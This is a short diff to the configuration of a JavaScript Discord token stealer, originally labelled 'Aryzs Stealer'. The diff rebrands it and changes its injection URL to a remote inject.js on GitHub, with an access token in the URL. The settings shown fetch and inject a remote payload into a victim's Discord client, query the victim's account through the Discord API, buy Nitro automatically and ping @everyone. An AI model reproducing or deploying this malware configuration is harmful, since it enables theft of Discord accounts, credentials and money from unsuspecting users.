@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Aryzs Stealer', 
+  embed_name: 'moonsz#0054', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
-  injection_url: 'https://raw.githubusercontent.com/haxdeveloper/moonsz#0054/master/grabber-payload.js', 
+  injection_url: 'https://raw.githubusercontent.com/Emny6/apiinjectionlblalbla/main/inject.js?token=GHSAT0AAAAAABVNWNLL7OC5MLTRKNYVVB3QYVWGCIQ', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
